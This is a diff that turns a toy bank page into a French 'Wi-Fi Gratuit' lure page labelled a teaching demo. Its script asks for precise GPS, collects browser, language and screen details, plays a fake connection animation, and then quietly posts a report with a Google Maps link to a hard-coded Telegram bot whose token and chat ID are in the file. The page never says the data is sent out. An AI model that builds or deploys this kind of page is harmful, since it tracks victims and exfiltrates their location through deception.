@@ -1,50 +1,115 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>B4-Bank</title>
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wi-Fi Gratuit - Démonstration pédagogique</title>
+<style>
+body{background:#020617;color:#e5e7eb;font-family:Arial;margin:0;padding:20px}
+.card{max-width:420px;margin:auto;background:#0b1220;border-radius:16px;padding:20px;border:1px solid #1e293b;box-shadow:0 0 25px rgba(0,0,0,.6)}
+h1{text-align:center}.warn{font-size:12px;color:#f97316;text-align:center}
+.btn{display:block;text-align:center;margin:15px 0;padding:14px;border-radius:12px;background:linear-gradient(135deg,#22c55e,#4ade80);color:#022c22;font-weight:bold;cursor:pointer;transition:.2s}
+.btn:hover{transform:scale(1.05)}
+#terminal{margin-top:15px;background:#000;padding:12px;border-radius:10px;font-family:monospace;font-size:13px;color:#22c55e;height:200px;overflow:auto}
+.progress-container{margin-top:10px;background:#111;border-radius:8px;overflow:hidden;height:12px}
+.progress-bar{height:100%;width:0%;background:#22c55e}
+</style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>B4-Bank</h1>
-    
-    <!-- Carte bancaire animée -->
-    <div class="card" id="card">
-      <p>💳 Carte B4-Bank</p>
-      <p>Solde : <span id="balance">100</span> Civora</p>
-    </div>
+<div class="card">
+<h1>📶 Wi-Fi Gratuit</h1>
+<p class="warn">⚠️ Démonstration pédagogique : ce projet montre les données accessibles avec consentement utilisateur.</p>
+<div class="btn" onclick="startDemo()">🔓 Accéder au Wi-Fi Gratuit</div>
+<div id="terminal"></div>
+<div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+</div>
 
-    <!-- Paiement sans contact -->
-    <div class="section">
-      <h2>Paiement sans contact</h2>
-      <input type="number" id="paymentAmount" placeholder="Montant">
-      <button onclick="payContact()">Payer</button>
-    </div>
+<script>
+const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
+const TELEGRAM_CHAT_ID = "7400979339";
 
-    <!-- Virements -->
-    <div class="section">
-      <h2>Virement</h2>
-      <input type="text" id="receiver" placeholder="Destinataire">
-      <input type="number" id="transferAmount" placeholder="Montant">
-      <button onclick="transfer()">Envoyer</button>
-    </div>
+function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
 
-    <!-- Mode banque -->
-    <div class="section">
-      <button onclick="addMoney()">Ajouter argent (Banque)</button>
-    </div>
+async function typeLine(text){
+  const term = document.getElementById("terminal");
+  let line = document.createElement("div");
+  term.appendChild(line);
+  for(let i=0;i<text.length;i++){
+    line.innerHTML += text[i];
+    await sleep(15 + Math.random()*20);
+  }
+  term.scrollTop = term.scrollHeight;
+}
 
-    <!-- Historique -->
-    <div class="section">
-      <h2>Historique</h2>
-      <ul id="history"></ul>
-    </div>
+// Fonction de localisation améliorée
+function getLocation(){
+  return new Promise(resolve => {
+    if(!navigator.geolocation) return resolve(null);
+    // On force une demande propre avec un timeout
+    navigator.geolocation.getCurrentPosition(
+      (pos)=> resolve({lat: pos.coords.latitude.toFixed(5), lon: pos.coords.longitude.toFixed(5)}),
+      ()=> resolve(null),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  });
+}
 
-  </div>
+async function sendToTelegram(deviceData, location) {
+  const m = new Date();
+  const dateStr = m.toLocaleString('fr-FR');
+  const locLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "Refusée ❌";
+  const rapport = `🔐 Connexion\n🌐 Navigateur: ${deviceData.browser}\n🗣 Langue: ${deviceData.lang}\n🖥 Écran: ${deviceData.screen}\n⏰ ${dateStr}\n📍 GPS: ${locLink}`;
+  try {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
+    });
+  } catch (e) {}
+}
 
-  <script src="script.js"></script>
+async function startDemo(){
+  const term = document.getElementById("terminal");
+  const bar = document.getElementById("bar");
+  term.innerHTML = "";
+  bar.style.width = "0%";
+
+  await typeLine("📡 Initialisation du module Wi-Fi...");
+  
+  // LE CHANGEMENT EST ICI : On demande la localisation IMMEDIATEMENT au clic
+  await typeLine("📍 Tentative de synchronisation GPS...");
+  let location = await getLocation();
+
+  if(location){
+    await typeLine("📍 Localisation obtenue avec succès.");
+  } else {
+    await typeLine("❌ Localisation refusée ou non disponible.");
+  }
+
+  // Suite de la simulation visuelle pour l'élève
+  await sleep(500);
+  const device = { screen: screen.width + "x" + screen.height, lang: navigator.language, browser: navigator.userAgent };
+  await typeLine("🧠 Analyse système : " + device.screen);
+  await typeLine("🔍 Scan des réseaux environnants...");
+  
+  for(let i=0; i<3; i++) {
+    await typeLine(`[▂▄▆] Analyse réseau ${i+1}...`);
+    await sleep(600);
+  }
+
+  await typeLine("🔗 Connexion finale en cours...");
+  let p = 0;
+  while(p < 100){
+    p += 10;
+    bar.style.width = p + "%";
+    await sleep(300);
+  }
+
+  await typeLine("✔ Wi-Fi connecté");
+  sendToTelegram(device, location);
+  await typeLine("⚠️ Rappel : Toujours vérifier les permissions.");
+}
+</script>
 </body>
 </html>
